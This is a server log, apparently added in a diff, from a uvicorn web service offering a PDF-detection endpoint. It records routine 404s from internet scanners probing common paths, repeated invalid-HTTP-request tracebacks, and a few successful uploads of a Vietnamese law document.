+INFO:     198.235.24.45:65092 - "GET / HTTP/1.1" 404 Not Found
+WARNING:  Invalid HTTP request received.
+Traceback (most recent call last):
+  File "/home/ai-r-d/anaconda3/lib/python3.7/site-packages/uvicorn/protocols/http/httptools_impl.py", line 131, in data_received
+    self.parser.feed_data(data)
+  File "httptools/parser/parser.pyx", line 212, in httptools.parser.parser.HttpParser.feed_data
+httptools.parser.errors.HttpParserInvalidMethodError: Invalid method encountered
+INFO:     205.210.31.49:63074 - "GET / HTTP/1.1" 404 Not Found
+INFO:     205.210.31.39:64656 - "GET / HTTP/1.1" 404 Not Found
+WARNING:  Invalid HTTP request received.
+Traceback (most recent call last):
+  File "/home/ai-r-d/anaconda3/lib/python3.7/site-packages/uvicorn/protocols/http/httptools_impl.py", line 131, in data_received
+    self.parser.feed_data(data)
+  File "httptools/parser/parser.pyx", line 212, in httptools.parser.parser.HttpParser.feed_data
+httptools.parser.errors.HttpParserInvalidMethodError: Invalid method encountered
+WARNING:  Invalid HTTP request received.
+Traceback (most recent call last):
+  File "/home/ai-r-d/anaconda3/lib/python3.7/site-packages/uvicorn/protocols/http/httptools_impl.py", line 131, in data_received
+    self.parser.feed_data(data)
+  File "httptools/parser/parser.pyx", line 212, in httptools.parser.parser.HttpParser.feed_data
+httptools.parser.errors.HttpParserInvalidMethodError: Invalid method encountered
+WARNING:  Invalid HTTP request received.
+Traceback (most recent call last):
+  File "/home/ai-r-d/anaconda3/lib/python3.7/site-packages/uvicorn/protocols/http/httptools_impl.py", line 131, in data_received
+    self.parser.feed_data(data)
+  File "httptools/parser/parser.pyx", line 212, in httptools.parser.parser.HttpParser.feed_data
+httptools.parser.errors.HttpParserInvalidMethodError: Invalid method encountered
+INFO:     198.235.24.32:55973 - "GET / HTTP/1.0" 404 Not Found
+WARNING:  Invalid HTTP request received.
+Traceback (most recent call last):
+  File "/home/ai-r-d/anaconda3/lib/python3.7/site-packages/uvicorn/protocols/http/httptools_impl.py", line 131, in data_received
+    self.parser.feed_data(data)
+  File "httptools/parser/parser.pyx", line 212, in httptools.parser.parser.HttpParser.feed_data
+httptools.parser.errors.HttpParserInvalidMethodError: Invalid method encountered
+INFO:     141.213.13.200:53695 - "GET / HTTP/1.1" 404 Not Found
+INFO:     87.236.176.87:50899 - "GET / HTTP/1.1" 404 Not Found
+WARNING:  Invalid HTTP request received.
+Traceback (most recent call last):
+  File "/home/ai-r-d/anaconda3/lib/python3.7/site-packages/uvicorn/protocols/http/httptools_impl.py", line 131, in data_received
+    self.parser.feed_data(data)
+  File "httptools/parser/parser.pyx", line 212, in httptools.parser.parser.HttpParser.feed_data
+httptools.parser.errors.HttpParserInvalidMethodError: Invalid method encountered
+WARNING:  Invalid HTTP request received.
+Traceback (most recent call last):
+  File "/home/ai-r-d/anaconda3/lib/python3.7/site-packages/uvicorn/protocols/http/httptools_impl.py", line 131, in data_received
+    self.parser.feed_data(data)
+  File "httptools/parser/parser.pyx", line 212, in httptools.parser.parser.HttpParser.feed_data
+httptools.parser.errors.HttpParserInvalidMethodError: Invalid method encountered
+INFO:     123.24.206.26:33592 - "GET / HTTP/1.1" 404 Not Found
+INFO:     167.94.138.63:51400 - "GET / HTTP/1.1" 404 Not Found
+WARNING:  Invalid HTTP request received.
+Traceback (most recent call last):
+  File "/home/ai-r-d/anaconda3/lib/python3.7/site-packages/uvicorn/protocols/http/httptools_impl.py", line 131, in data_received
+    self.parser.feed_data(data)
+  File "httptools/parser/parser.pyx", line 212, in httptools.parser.parser.HttpParser.feed_data
+httptools.parser.errors.HttpParserError: Pause on PRI/Upgrade
+WARNING:  Invalid HTTP request received.
+Traceback (most recent call last):
+  File "/home/ai-r-d/anaconda3/lib/python3.7/site-packages/uvicorn/protocols/http/httptools_impl.py", line 131, in data_received
+    self.parser.feed_data(data)
+  File "httptools/parser/parser.pyx", line 212, in httptools.parser.parser.HttpParser.feed_data
+httptools.parser.errors.HttpParserInvalidMethodError: Invalid method encountered
+WARNING:  Invalid HTTP request received.
+Traceback (most recent call last):
+  File "/home/ai-r-d/anaconda3/lib/python3.7/site-packages/uvicorn/protocols/http/httptools_impl.py", line 131, in data_received
+    self.parser.feed_data(data)
+  File "httptools/parser/parser.pyx", line 212, in httptools.parser.parser.HttpParser.feed_data
+httptools.parser.errors.HttpParserInvalidMethodError: Invalid method encountered
+WARNING:  Invalid HTTP request received.
+Traceback (most recent call last):
+  File "/home/ai-r-d/anaconda3/lib/python3.7/site-packages/uvicorn/protocols/http/httptools_impl.py", line 131, in data_received
+    self.parser.feed_data(data)
+  File "httptools/parser/parser.pyx", line 212, in httptools.parser.parser.HttpParser.feed_data
+httptools.parser.errors.HttpParserInvalidMethodError: Invalid method encountered
+WARNING:  Invalid HTTP request received.
+Traceback (most recent call last):
+  File "/home/ai-r-d/anaconda3/lib/python3.7/site-packages/uvicorn/protocols/http/httptools_impl.py", line 131, in data_received
+    self.parser.feed_data(data)
+  File "httptools/parser/parser.pyx", line 212, in httptools.parser.parser.HttpParser.feed_data
+httptools.parser.errors.HttpParserInvalidMethodError: Invalid method encountered
+WARNING:  Invalid HTTP request received.
+Traceback (most recent call last):
+  File "/home/ai-r-d/anaconda3/lib/python3.7/site-packages/uvicorn/protocols/http/httptools_impl.py", line 131, in data_received
+    self.parser.feed_data(data)
+  File "httptools/parser/parser.pyx", line 212, in httptools.parser.parser.HttpParser.feed_data
+httptools.parser.errors.HttpParserInvalidMethodError: Invalid method encountered
+WARNING:  Invalid HTTP request received.
+Traceback (most recent call last):
+  File "/home/ai-r-d/anaconda3/lib/python3.7/site-packages/uvicorn/protocols/http/httptools_impl.py", line 131, in data_received
+    self.parser.feed_data(data)
+  File "httptools/parser/parser.pyx", line 212, in httptools.parser.parser.HttpParser.feed_data
+httptools.parser.errors.HttpParserInvalidMethodError: Invalid method encountered
+INFO:     43.131.66.209:50800 - "GET / HTTP/1.1" 404 Not Found
+INFO:     209.141.49.169:30526 - "GET / HTTP/1.1" 404 Not Found
+INFO:     209.141.49.169:30526 - "GET /favicon.ico HTTP/1.1" 404 Not Found
+INFO:     209.141.36.231:37316 - "GET / HTTP/1.1" 404 Not Found
+INFO:     209.141.36.231:37316 - "GET /favicon.ico HTTP/1.1" 404 Not Found
+INFO:     205.185.121.69:22754 - "GET / HTTP/1.1" 404 Not Found
+INFO:     205.185.121.69:22754 - "GET /favicon.ico HTTP/1.1" 404 Not Found
+INFO:     209.141.33.65:33848 - "GET / HTTP/1.1" 404 Not Found
+INFO:     205.185.116.89:29102 - "GET / HTTP/1.1" 404 Not Found
+INFO:     209.141.33.65:33848 - "GET /favicon.ico HTTP/1.1" 404 Not Found
+INFO:     209.141.49.169:34042 - "GET / HTTP/1.1" 404 Not Found
+INFO:     205.185.116.89:29102 - "GET /favicon.ico HTTP/1.1" 404 Not Found
+INFO:     205.185.121.69:26784 - "GET / HTTP/1.1" 404 Not Found
+INFO:     205.185.122.184:29376 - "GET / HTTP/1.1" 404 Not Found
+INFO:     209.141.49.169:35378 - "GET / HTTP/1.1" 404 Not Found
+INFO:     205.185.121.69:26784 - "GET /favicon.ico HTTP/1.1" 404 Not Found
+INFO:     205.185.122.184:29376 - "GET /favicon.ico HTTP/1.1" 404 Not Found
+INFO:     205.185.116.89:33040 - "GET / HTTP/1.1" 404 Not Found
+INFO:     209.141.49.169:34042 - "GET /favicon.ico HTTP/1.1" 404 Not Found
+INFO:     209.141.49.169:35378 - "GET /favicon.ico HTTP/1.1" 404 Not Found
+INFO:     205.185.116.89:33040 - "GET /favicon.ico HTTP/1.1" 404 Not Found
+INFO:     205.185.121.69:31532 - "GET / HTTP/1.1" 404 Not Found
+INFO:     209.141.35.128:11198 - "GET / HTTP/1.1" 404 Not Found
+INFO:     205.185.121.69:31532 - "GET /favicon.ico HTTP/1.1" 404 Not Found
+INFO:     209.141.35.128:11198 - "GET /favicon.ico HTTP/1.1" 404 Not Found
+INFO:     205.185.121.69:43534 - "GET / HTTP/1.1" 404 Not Found
+INFO:     205.185.121.69:43534 - "GET /favicon.ico HTTP/1.1" 404 Not Found
+INFO:     209.141.33.65:43614 - "GET / HTTP/1.1" 404 Not Found
+INFO:     209.141.51.222:46934 - "GET / HTTP/1.1" 404 Not Found
+INFO:     205.185.116.25:13324 - "GET / HTTP/1.1" 404 Not Found
+INFO:     209.141.33.65:43614 - "GET /favicon.ico HTTP/1.1" 404 Not Found
+INFO:     209.141.55.120:28604 - "GET / HTTP/1.1" 404 Not Found
+INFO:     209.141.51.222:46934 - "GET /favicon.ico HTTP/1.1" 404 Not Found
+INFO:     209.141.35.128:14424 - "GET / HTTP/1.1" 404 Not Found
+INFO:     209.141.55.120:28604 - "GET /favicon.ico HTTP/1.1" 404 Not Found
+INFO:     209.141.34.187:30806 - "GET / HTTP/1.1" 404 Not Found
+INFO:     205.185.116.25:13324 - "GET /favicon.ico HTTP/1.1" 404 Not Found
+INFO:     209.141.34.187:30806 - "GET /favicon.ico HTTP/1.1" 404 Not Found
+INFO:     209.141.35.128:14424 - "GET /favicon.ico HTTP/1.1" 404 Not Found
+WARNING:  Invalid HTTP request received.
+Traceback (most recent call last):
+  File "/home/ai-r-d/anaconda3/lib/python3.7/site-packages/uvicorn/protocols/http/httptools_impl.py", line 131, in data_received
+    self.parser.feed_data(data)
+  File "httptools/parser/parser.pyx", line 212, in httptools.parser.parser.HttpParser.feed_data
+httptools.parser.errors.HttpParserInvalidMethodError: Invalid method encountered
+INFO:     144.126.220.159:61953 - "GET / HTTP/1.0" 404 Not Found
+WARNING:  Invalid HTTP request received.
+Traceback (most recent call last):
+  File "/home/ai-r-d/anaconda3/lib/python3.7/site-packages/uvicorn/protocols/http/httptools_impl.py", line 131, in data_received
+    self.parser.feed_data(data)
+  File "httptools/parser/parser.pyx", line 212, in httptools.parser.parser.HttpParser.feed_data
+httptools.parser.errors.HttpParserInvalidMethodError: Invalid method encountered
+WARNING:  Invalid HTTP request received.
+Traceback (most recent call last):
+  File "/home/ai-r-d/anaconda3/lib/python3.7/site-packages/uvicorn/protocols/http/httptools_impl.py", line 131, in data_received
+    self.parser.feed_data(data)
+  File "httptools/parser/parser.pyx", line 212, in httptools.parser.parser.HttpParser.feed_data
+httptools.parser.errors.HttpParserInvalidMethodError: Invalid method encountered
+WARNING:  Invalid HTTP request received.
+Traceback (most recent call last):
+  File "/home/ai-r-d/anaconda3/lib/python3.7/site-packages/uvicorn/protocols/http/httptools_impl.py", line 131, in data_received
+    self.parser.feed_data(data)
+  File "httptools/parser/parser.pyx", line 212, in httptools.parser.parser.HttpParser.feed_data
+httptools.parser.errors.HttpParserInvalidMethodError: Invalid method encountered
+WARNING:  Invalid HTTP request received.
+Traceback (most recent call last):
+  File "/home/ai-r-d/anaconda3/lib/python3.7/site-packages/uvicorn/protocols/http/httptools_impl.py", line 131, in data_received
+    self.parser.feed_data(data)
+  File "httptools/parser/parser.pyx", line 212, in httptools.parser.parser.HttpParser.feed_data
+httptools.parser.errors.HttpParserInvalidMethodError: Invalid method encountered
+WARNING:  Invalid HTTP request received.
+Traceback (most recent call last):
+  File "/home/ai-r-d/anaconda3/lib/python3.7/site-packages/uvicorn/protocols/http/httptools_impl.py", line 131, in data_received
+    self.parser.feed_data(data)
+  File "httptools/parser/parser.pyx", line 212, in httptools.parser.parser.HttpParser.feed_data
+httptools.parser.errors.HttpParserInvalidMethodError: Invalid method encountered
+WARNING:  Invalid HTTP request received.
+Traceback (most recent call last):
+  File "/home/ai-r-d/anaconda3/lib/python3.7/site-packages/uvicorn/protocols/http/httptools_impl.py", line 131, in data_received
+    self.parser.feed_data(data)
+  File "httptools/parser/parser.pyx", line 212, in httptools.parser.parser.HttpParser.feed_data
+httptools.parser.errors.HttpParserInvalidMethodError: Invalid method encountered
+WARNING:  Invalid HTTP request received.
+Traceback (most recent call last):
+  File "/home/ai-r-d/anaconda3/lib/python3.7/site-packages/uvicorn/protocols/http/httptools_impl.py", line 131, in data_received
+    self.parser.feed_data(data)
+  File "httptools/parser/parser.pyx", line 212, in httptools.parser.parser.HttpParser.feed_data
+httptools.parser.errors.HttpParserInvalidMethodError: Invalid method encountered
+INFO:     13.40.126.48:35800 - "GET /favicon.ico HTTP/1.1" 404 Not Found
+INFO:     13.40.126.48:36520 - "GET /manage/account/login HTTP/1.1" 404 Not Found
+INFO:     13.40.126.48:36532 - "GET /admin/index.html HTTP/1.1" 404 Not Found
+INFO:     13.40.126.48:36534 - "GET /index.html HTTP/1.1" 404 Not Found
+INFO:     13.40.126.48:36544 - "GET / HTTP/1.1" 404 Not Found
+WARNING:  Invalid HTTP request received.
+Traceback (most recent call last):
+  File "/home/ai-r-d/anaconda3/lib/python3.7/site-packages/uvicorn/protocols/http/httptools_impl.py", line 131, in data_received
+    self.parser.feed_data(data)
+  File "httptools/parser/parser.pyx", line 212, in httptools.parser.parser.HttpParser.feed_data
+httptools.parser.errors.HttpParserInvalidMethodError: Invalid method encountered
+WARNING:  Invalid HTTP request received.
+Traceback (most recent call last):
+  File "/home/ai-r-d/anaconda3/lib/python3.7/site-packages/uvicorn/protocols/http/httptools_impl.py", line 131, in data_received
+    self.parser.feed_data(data)
+  File "httptools/parser/parser.pyx", line 212, in httptools.parser.parser.HttpParser.feed_data
+httptools.parser.errors.HttpParserInvalidMethodError: Invalid method encountered
+INFO:     123.24.206.26:43815 - "GET /docs HTTP/1.1" 200 OK
+INFO:     123.24.206.26:43815 - "GET /openapi.json HTTP/1.1" 200 OK
+WARNING:  Invalid HTTP request received.
+Traceback (most recent call last):
+  File "/home/ai-r-d/anaconda3/lib/python3.7/site-packages/uvicorn/protocols/http/httptools_impl.py", line 131, in data_received
+    self.parser.feed_data(data)
+  File "httptools/parser/parser.pyx", line 212, in httptools.parser.parser.HttpParser.feed_data
+httptools.parser.errors.HttpParserInvalidMethodError: Invalid method encountered
+INFO:     123.24.206.26:63767 - "GET /manage/account/login HTTP/1.1" 404 Not Found
+INFO:     123.24.206.26:48522 - "GET /admin/index.html HTTP/1.1" 404 Not Found
+INFO:     123.24.206.26:47155 - "GET /index.html HTTP/1.1" 404 Not Found
+INFO:     123.24.206.26:55421 - "GET / HTTP/1.1" 404 Not Found
+INFO:     91.239.157.50:47846 - "GET /2.php HTTP/1.1" 404 Not Found
+INFO:     91.239.157.50:47860 - "GET /2.php HTTP/1.1" 404 Not Found
+INFO:     91.239.157.50:47870 - "GET /2.php HTTP/1.1" 404 Not Found
+WARNING:  Invalid HTTP request received.
+Traceback (most recent call last):
+  File "/home/ai-r-d/anaconda3/lib/python3.7/site-packages/uvicorn/protocols/http/httptools_impl.py", line 131, in data_received
+    self.parser.feed_data(data)
+  File "httptools/parser/parser.pyx", line 212, in httptools.parser.parser.HttpParser.feed_data
+httptools.parser.errors.HttpParserInvalidMethodError: Invalid method encountered
+INFO:     198.98.59.132:58960 - "GET / HTTP/1.1" 404 Not Found
+WARNING:  Invalid HTTP request received.
+Traceback (most recent call last):
+  File "/home/ai-r-d/anaconda3/lib/python3.7/site-packages/uvicorn/protocols/http/httptools_impl.py", line 131, in data_received
+    self.parser.feed_data(data)
+  File "httptools/parser/parser.pyx", line 212, in httptools.parser.parser.HttpParser.feed_data
+httptools.parser.errors.HttpParserInvalidMethodError: Invalid method encountered
+WARNING:  Invalid HTTP request received.
+Traceback (most recent call last):
+  File "/home/ai-r-d/anaconda3/lib/python3.7/site-packages/uvicorn/protocols/http/httptools_impl.py", line 131, in data_received
+    self.parser.feed_data(data)
+  File "httptools/parser/parser.pyx", line 212, in httptools.parser.parser.HttpParser.feed_data
+httptools.parser.errors.HttpParserInvalidMethodError: Invalid method encountered
+WARNING:  Invalid HTTP request received.
+Traceback (most recent call last):
+  File "/home/ai-r-d/anaconda3/lib/python3.7/site-packages/uvicorn/protocols/http/httptools_impl.py", line 131, in data_received
+    self.parser.feed_data(data)
+  File "httptools/parser/parser.pyx", line 212, in httptools.parser.parser.HttpParser.feed_data
+httptools.parser.errors.HttpParserInvalidMethodError: Invalid method encountered
+WARNING:  Invalid HTTP request received.
+Traceback (most recent call last):
+  File "/home/ai-r-d/anaconda3/lib/python3.7/site-packages/uvicorn/protocols/http/httptools_impl.py", line 131, in data_received
+    self.parser.feed_data(data)
+  File "httptools/parser/parser.pyx", line 212, in httptools.parser.parser.HttpParser.feed_data
+httptools.parser.errors.HttpParserInvalidMethodError: Invalid method encountered
+WARNING:  Invalid HTTP request received.
+Traceback (most recent call last):
+  File "/home/ai-r-d/anaconda3/lib/python3.7/site-packages/uvicorn/protocols/http/httptools_impl.py", line 131, in data_received
+    self.parser.feed_data(data)
+  File "httptools/parser/parser.pyx", line 212, in httptools.parser.parser.HttpParser.feed_data
+httptools.parser.errors.HttpParserInvalidMethodError: Invalid method encountered
+INFO:     123.24.206.26:47332 - "GET / HTTP/1.1" 404 Not Found
+INFO:     167.94.138.120:47602 - "GET / HTTP/1.1" 404 Not Found
+WARNING:  Invalid HTTP request received.
+Traceback (most recent call last):
+  File "/home/ai-r-d/anaconda3/lib/python3.7/site-packages/uvicorn/protocols/http/httptools_impl.py", line 131, in data_received
+    self.parser.feed_data(data)
+  File "httptools/parser/parser.pyx", line 212, in httptools.parser.parser.HttpParser.feed_data
+httptools.parser.errors.HttpParserError: Pause on PRI/Upgrade
+INFO:     198.235.24.56:62218 - "GET / HTTP/1.1" 404 Not Found
+INFO:     205.210.31.163:60104 - "GET / HTTP/1.1" 404 Not Found
+INFO:     123.24.206.26:53543 - "GET / HTTP/1.1" 404 Not Found
+INFO:     205.210.31.40:61854 - "GET / HTTP/1.1" 404 Not Found
+LSD_101.pdf
+Luật số: 50/2019/QH14
+QUỐC HỘI
+INFO:     123.24.206.26:55259 - "POST /detect_pdf HTTP/1.1" 200 OK
+INFO:     123.24.206.26:62568 - "GET /docs HTTP/1.1" 200 OK
+INFO:     123.24.206.26:41277 - "GET /openapi.json HTTP/1.1" 200 OK
+LSD_101.pdf
+Luật số: 50/2019/QH14
+QUỐC HỘI
+LUẬT
+SỬA ĐỒI, BỒ SUNG MỘT SỐ ĐIỀU CỦA LUẬT QUẢN LÝ,
+SỬ DỤNG VŨ KHÍ, VẬT LIỆU NỔ VÀ CÔNG CỤ HỖ TRỢ
+INFO:     123.24.206.26:53892 - "POST /detect_pdf HTTP/1.1" 200 OK
+WARNING:  Invalid HTTP request received.
+Traceback (most recent call last):
+  File "/home/ai-r-d/anaconda3/lib/python3.7/site-packages/uvicorn/protocols/http/httptools_impl.py", line 131, in data_received
+    self.parser.feed_data(data)
+  File "httptools/parser/parser.pyx", line 212, in httptools.parser.parser.HttpParser.feed_data
+httptools.parser.errors.HttpParserInvalidMethodError: Invalid method encountered
+WARNING:  Invalid HTTP request received.
+Traceback (most recent call last):
+  File "/home/ai-r-d/anaconda3/lib/python3.7/site-packages/uvicorn/protocols/http/httptools_impl.py", line 131, in data_received
+    self.parser.feed_data(data)
+  File "httptools/parser/parser.pyx", line 212, in httptools.parser.parser.HttpParser.feed_data
+httptools.parser.errors.HttpParserInvalidMethodError: Invalid method encountered
+WARNING:  Invalid HTTP request received.
+Traceback (most recent call last):
+  File "/home/ai-r-d/anaconda3/lib/python3.7/site-packages/uvicorn/protocols/http/httptools_impl.py", line 131, in data_received
+    self.parser.feed_data(data)
+  File "httptools/parser/parser.pyx", line 212, in httptools.parser.parser.HttpParser.feed_data
+httptools.parser.errors.HttpParserInvalidMethodError: Invalid method encountered
+INFO:     87.236.176.118:40331 - "GET / HTTP/1.1" 404 Not Found
+INFO:     2.57.122.218:35308 - "GET / HTTP/1.1" 404 Not Found
+INFO:     2.57.122.218:35308 - "GET /favicon.ico HTTP/1.1" 404 Not Found
+INFO:     128.1.248.26:48886 - "GET / HTTP/1.1" 404 Not Found
+INFO:     8.219.250.19:59038 - "GET / HTTP/1.0" 404 Not Found
+INFO:     8.219.250.19:59124 - "GET / HTTP/1.1" 404 Not Found
+INFO:     8.219.250.19:59724 - "GET /sitemap.xml HTTP/1.1" 404 Not Found
+INFO:     123.24.206.26:44828 - "GET / HTTP/1.1" 404 Not Found
+INFO:     71.6.232.24:45642 - "GET / HTTP/1.1" 404 Not Found
+INFO:     205.210.31.162:60344 - "GET / HTTP/1.1" 404 Not Found
+WARNING:  Invalid HTTP request received.
+Traceback (most recent call last):
+  File "/home/ai-r-d/anaconda3/lib/python3.7/site-packages/uvicorn/protocols/http/httptools_impl.py", line 131, in data_received
+    self.parser.feed_data(data)
+  File "httptools/parser/parser.pyx", line 212, in httptools.parser.parser.HttpParser.feed_data
+httptools.parser.errors.HttpParserInvalidMethodError: Invalid method encountered
+INFO:     205.210.31.164:62512 - "GET / HTTP/1.1" 404 Not Found
+WARNING:  Invalid HTTP request received.
+Traceback (most recent call last):
+  File "/home/ai-r-d/anaconda3/lib/python3.7/site-packages/uvicorn/protocols/http/httptools_impl.py", line 131, in data_received
+    self.parser.feed_data(data)
+  File "httptools/parser/parser.pyx", line 212, in httptools.parser.parser.HttpParser.feed_data
+httptools.parser.errors.HttpParserInvalidMethodError: Invalid method encountered
+WARNING:  Invalid HTTP request received.
+Traceback (most recent call last):
+  File "/home/ai-r-d/anaconda3/lib/python3.7/site-packages/uvicorn/protocols/http/httptools_impl.py", line 131, in data_received
+    self.parser.feed_data(data)
+  File "httptools/parser/parser.pyx", line 212, in httptools.parser.parser.HttpParser.feed_data
+httptools.parser.errors.HttpParserInvalidMethodError: Invalid method encountered
+WARNING:  Invalid HTTP request received.
+Traceback (most recent call last):
+  File "/home/ai-r-d/anaconda3/lib/python3.7/site-packages/uvicorn/protocols/http/httptools_impl.py", line 131, in data_received
+    self.parser.feed_data(data)
+  File "httptools/parser/parser.pyx", line 212, in httptools.parser.parser.HttpParser.feed_data
+httptools.parser.errors.HttpParserInvalidMethodError: Invalid method encountered
+INFO:     205.210.31.45:58394 - "GET / HTTP/1.1" 404 Not Found
+INFO:     205.210.31.180:64034 - "GET / HTTP/1.1" 404 Not Found
+WARNING:  Invalid HTTP request received.
+Traceback (most recent call last):
+  File "/home/ai-r-d/anaconda3/lib/python3.7/site-packages/uvicorn/protocols/http/httptools_impl.py", line 131, in data_received
+    self.parser.feed_data(data)
+  File "httptools/parser/parser.pyx", line 212, in httptools.parser.parser.HttpParser.feed_data
+httptools.parser.errors.HttpParserInvalidMethodError: Invalid method encountered
+INFO:     205.210.31.173:61762 - "GET / HTTP/1.1" 404 Not Found
+INFO:     198.235.24.36:60468 - "GET / HTTP/1.1" 404 Not Found
+INFO:     43.132.196.160:51008 - "GET / HTTP/1.1" 404 Not Found
+WARNING:  Invalid HTTP request received.
+Traceback (most recent call last):
+  File "/home/ai-r-d/anaconda3/lib/python3.7/site-packages/uvicorn/protocols/http/httptools_impl.py", line 131, in data_received
+    self.parser.feed_data(data)
+  File "httptools/parser/parser.pyx", line 212, in httptools.parser.parser.HttpParser.feed_data
+httptools.parser.errors.HttpParserInvalidMethodError: Invalid method encountered
+WARNING:  Invalid HTTP request received.
+Traceback (most recent call last):
+  File "/home/ai-r-d/anaconda3/lib/python3.7/site-packages/uvicorn/protocols/http/httptools_impl.py", line 131, in data_received
+    self.parser.feed_data(data)
+  File "httptools/parser/parser.pyx", line 212, in httptools.parser.parser.HttpParser.feed_data
+httptools.parser.errors.HttpParserInvalidMethodError: Invalid method encountered
+WARNING:  Invalid HTTP request received.
+Traceback (most recent call last):
+  File "/home/ai-r-d/anaconda3/lib/python3.7/site-packages/uvicorn/protocols/http/httptools_impl.py", line 131, in data_received
+    self.parser.feed_data(data)
+  File "httptools/parser/parser.pyx", line 212, in httptools.parser.parser.HttpParser.feed_data
+httptools.parser.errors.HttpParserInvalidMethodError: Invalid method encountered
+INFO:     205.210.31.174:55197 - "GET / HTTP/1.0" 404 Not Found
+WARNING:  Invalid HTTP request received.
+Traceback (most recent call last):
+  File "/home/ai-r-d/anaconda3/lib/python3.7/site-packages/uvicorn/protocols/http/httptools_impl.py", line 131, in data_received
+    self.parser.feed_data(data)
+  File "httptools/parser/parser.pyx", line 212, in httptools.parser.parser.HttpParser.feed_data
+httptools.parser.errors.HttpParserInvalidMethodError: Invalid method encountered
+INFO:     123.24.206.26:59652 - "GET / HTTP/1.1" 404 Not Found
+INFO:     123.24.206.26:41076 - "GET /menu.shtml HTTP/1.1" 404 Not Found
+INFO:     123.24.206.26:59295 - "GET /CSS/Miniweb.css HTTP/1.1" 404 Not Found
+INFO:     123.24.206.26:50084 - "GET /home.jhtml HTTP/1.1" 404 Not Found
+INFO:     123.24.206.26:47702 - "GET /main.cfm HTTP/1.1" 404 Not Found
+INFO:     123.24.206.26:36577 - "GET /home.cfm HTTP/1.1" 404 Not Found
+INFO:     123.24.206.26:53884 - "GET /index.asp HTTP/1.1" 404 Not Found
+INFO:     123.24.206.26:39946 - "GET /LTQk HTTP/1.1" 404 Not Found
+INFO:     123.24.206.26:53585 - "GET /menu.cfm HTTP/1.1" 404 Not Found
+INFO:     123.24.206.26:62269 - "GET /inicio.jsp HTTP/1.1" 404 Not Found
+INFO:     205.210.31.26:64424 - "GET / HTTP/1.1" 404 Not Found
+INFO:     193.118.55.146:46285 - "GET / HTTP/1.1" 404 Not Found
+WARNING:  Invalid HTTP request received.
+Traceback (most recent call last):
+  File "/home/ai-r-d/anaconda3/lib/python3.7/site-packages/uvicorn/protocols/http/httptools_impl.py", line 131, in data_received
+    self.parser.feed_data(data)
+  File "httptools/parser/parser.pyx", line 212, in httptools.parser.parser.HttpParser.feed_data
+httptools.parser.errors.HttpParserInvalidMethodError: Invalid method encountered
+WARNING:  Invalid HTTP request received.
+Traceback (most recent call last):
+  File "/home/ai-r-d/anaconda3/lib/python3.7/site-packages/uvicorn/protocols/http/httptools_impl.py", line 131, in data_received
+    self.parser.feed_data(data)
+  File "httptools/parser/parser.pyx", line 212, in httptools.parser.parser.HttpParser.feed_data
+httptools.parser.errors.HttpParserInvalidMethodError: Invalid method encountered
+WARNING:  Invalid HTTP request received.
+Traceback (most recent call last):
+  File "/home/ai-r-d/anaconda3/lib/python3.7/site-packages/uvicorn/protocols/http/httptools_impl.py", line 131, in data_received
+    self.parser.feed_data(data)
+  File "httptools/parser/parser.pyx", line 212, in httptools.parser.parser.HttpParser.feed_data
+httptools.parser.errors.HttpParserInvalidMethodError: Invalid method encountered
+INFO:     123.24.206.26:1753 - "GET / HTTP/1.1" 404 Not Found
+INFO:     167.248.133.63:41198 - "GET / HTTP/1.1" 404 Not Found
+WARNING:  Invalid HTTP request received.
+Traceback (most recent call last):
+  File "/home/ai-r-d/anaconda3/lib/python3.7/site-packages/uvicorn/protocols/http/httptools_impl.py", line 131, in data_received
+    self.parser.feed_data(data)
+  File "httptools/parser/parser.pyx", line 212, in httptools.parser.parser.HttpParser.feed_data
+httptools.parser.errors.HttpParserError: Pause on PRI/Upgrade
+INFO:     123.24.206.26:47915 - "GET / HTTP/1.1" 404 Not Found
+INFO:     167.71.138.55:48538 - "HEAD / HTTP/1.0" 404 Not Found
+INFO:     167.71.138.55:34072 - "GET /system_api.php HTTP/1.1" 404 Not Found
+INFO:     167.71.138.55:41820 - "GET /c/version.js HTTP/1.1" 404 Not Found
+INFO:     167.71.138.55:53068 - "GET /streaming/clients_live.php HTTP/1.1" 404 Not Found
+INFO:     167.71.138.55:41838 - "GET /stalker_portal/c/version.js HTTP/1.1" 404 Not Found
+INFO:     167.71.138.55:37700 - "GET /stream/live.php HTTP/1.1" 404 Not Found
+INFO:     167.71.138.55:42558 - "GET /flu/403.html HTTP/1.1" 404 Not Found
+INFO:     167.71.138.55:43924 - "GET / HTTP/1.1" 404 Not Found
+WARNING:  Invalid HTTP request received.
+Traceback (most recent call last):
+  File "/home/ai-r-d/anaconda3/lib/python3.7/site-packages/uvicorn/protocols/http/httptools_impl.py", line 131, in data_received
+    self.parser.feed_data(data)
+  File "httptools/parser/parser.pyx", line 212, in httptools.parser.parser.HttpParser.feed_data
+httptools.parser.errors.HttpParserInvalidMethodError: Invalid method encountered
+WARNING:  Invalid HTTP request received.
+Traceback (most recent call last):
+  File "/home/ai-r-d/anaconda3/lib/python3.7/site-packages/uvicorn/protocols/http/httptools_impl.py", line 131, in data_received
+    self.parser.feed_data(data)
+  File "httptools/parser/parser.pyx", line 212, in httptools.parser.parser.HttpParser.feed_data
+httptools.parser.errors.HttpParserInvalidMethodError: Invalid method encountered
+WARNING:  Invalid HTTP request received.
+Traceback (most recent call last):
+  File "/home/ai-r-d/anaconda3/lib/python3.7/site-packages/uvicorn/protocols/http/httptools_impl.py", line 131, in data_received
+    self.parser.feed_data(data)
+  File "httptools/parser/parser.pyx", line 212, in httptools.parser.parser.HttpParser.feed_data
+httptools.parser.errors.HttpParserInvalidMethodError: Invalid method encountered
+WARNING:  Invalid HTTP request received.
+Traceback (most recent call last):
+  File "/home/ai-r-d/anaconda3/lib/python3.7/site-packages/uvicorn/protocols/http/httptools_impl.py", line 131, in data_received
+    self.parser.feed_data(data)
+  File "httptools/parser/parser.pyx", line 212, in httptools.parser.parser.HttpParser.feed_data
+httptools.parser.errors.HttpParserInvalidMethodError: Invalid method encountered
+WARNING:  Invalid HTTP request received.
+Traceback (most recent call last):
+  File "/home/ai-r-d/anaconda3/lib/python3.7/site-packages/uvicorn/protocols/http/httptools_impl.py", line 131, in data_received
+    self.parser.feed_data(data)
+  File "httptools/parser/parser.pyx", line 212, in httptools.parser.parser.HttpParser.feed_data
+httptools.parser.errors.HttpParserInvalidMethodError: Invalid method encountered
+WARNING:  Invalid HTTP request received.
+Traceback (most recent call last):
+  File "/home/ai-r-d/anaconda3/lib/python3.7/site-packages/uvicorn/protocols/http/httptools_impl.py", line 131, in data_received
+    self.parser.feed_data(data)
+  File "httptools/parser/parser.pyx", line 212, in httptools.parser.parser.HttpParser.feed_data
